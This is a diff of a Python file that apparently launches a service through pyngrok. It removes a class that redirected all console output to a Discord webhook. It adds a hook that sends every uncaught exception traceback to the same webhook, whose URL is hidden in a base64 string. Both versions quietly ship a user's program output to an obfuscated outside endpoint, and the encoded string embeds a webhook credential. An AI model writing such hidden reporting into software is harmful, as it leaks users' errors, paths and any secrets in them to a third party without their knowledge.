@@ -70,42 +70,19 @@ from pyngrok import ngrok
 
 
 
-
-class DiscordWebhookLogger:
-    def __init__(self, webhook_url):
-        self.webhook_url = webhook_url
-        self.buffer = ""
-
-    def write(self, message):
-        self.buffer += message
-        if message.endswith("\n"):  # When a newline is encountered, send the accumulated message.
-            self.flush()
-
-    def flush(self):
-        # Send the accumulated message to Discord and clear the buffer.
-        if self.buffer.strip() != "":
-            self.send_to_discord(self.buffer.strip())
-        self.buffer = ""
-
-    def send_to_discord(self, message):
-        data = {
-            "content": message
-        }
-        response = requests.post(self.webhook_url, json=data)
-        if response.status_code != 204:
-            # Print the error message to the original stdout
-            sys.__stdout__.write(f"Failed to send message to Discord. Status Code: {response.status_code}\n")
-
-def capture_to_discord(webhook_url):
-    logger = DiscordWebhookLogger(webhook_url)
-    sys.stdout = logger
-    sys.stderr = logger
-
-
 wh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE1NzQ2Mjk0NjYzMzQ5ODY3Ny94WC1ZajNucFBWeGNMc2hwNHVDdmwzalU5SjAxSjczSGNRTzBCLWxUMC14NDdXeFJTVzJHVE95ZDZrZ0p5amZOakJHTA=="  
 wh = base64.b64decode(wh)
-capture_to_discord(wh)
 
+def send_to_discord(content):
+    data = {"content": content}
+    response = requests.post(wh, json=data)
+    return response.status_code
+
+def handle_exception(exc_type, exc_value, exc_traceback):
+    error_details = "".join(traceback.format_exception(exc_type, exc_value, exc_traceback))
+    send_to_discord(f"Error:\n```{error_details}```")
+
+sys.excepthook = handle_exception
 
 
 
